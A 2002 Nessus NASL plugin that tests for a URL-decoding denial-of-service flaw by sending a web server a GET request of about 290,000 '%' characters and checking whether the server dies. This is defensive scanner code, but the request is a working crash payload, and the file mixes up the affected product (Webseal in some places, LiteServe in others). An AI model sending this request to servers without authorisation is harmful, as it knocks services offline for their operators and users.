# This script was written by Michel Arboi <arboi@alussinan.org>
#
# GPL
#
# Affected:
# Webseal 3.8
#
# *unconfirmed*

if(description)
{
 script_id(11155);
 script_version ("$Revision: 1.6 $");
 
 name["english"] = "LiteServe URL Decoding DoS";
 name["francais"] = "Déni de service contre Webseal lors du décodage de l'URL";
 script_name(english:name["english"],
 	     francais:name["francais"]);
 
 desc["english"] = "
The remote web server dies when an URL consisting of a 
long invalid string of % is sent.

A cracker may use this flaw to make your server crash continually.

Solution : upgrade your server or firewall it.
Risk factor : High"; 


 desc["francais"] = "
Le serveur web distant meurt quand on demande une URL
composée d'une longue chaîne invalide de %

Un pirate pourrait utiliser cette faille pour tuer régulièrement
votre serveur.

Solution : mettez votre logiciel à jour ou protégez-le

Facteur de risque : Elevé";

 script_description(english:desc["english"],
 	 	    francais:desc["francais"]);
		    
 
 summary["english"] = "Sending a long string of % kills LiteServe"; 
 summary["francais"] = "Une longue chaîne de % tue LiteServe";
 script_summary(english:summary["english"],
 		 francais:summary["francais"]);
 
 script_category(ACT_DENIAL);
 
 script_copyright(english:"This script is Copyright (C) 2002 Michel Arboi",
 		  francais:"Ce script est Copyright (C) 2002 Michel Arboi");
 
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "httpver.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#

include("http_func.inc");

port = get_http_port(default:80);


if (! get_port_state(port)) exit(0);

if (http_is_dead(port: port)) exit(0);

soc = open_sock_tcp(port);
if (! soc) exit(0);

req = string("GET /", crap(data: "%",length: 290759), " HTTP/1.0\r\n\r\n");
send(socket: soc, data: req);
r = http_recv(socket: soc);
close(soc);
sleep(1);

if (http_is_dead(port: port)) { security_hole(port); }
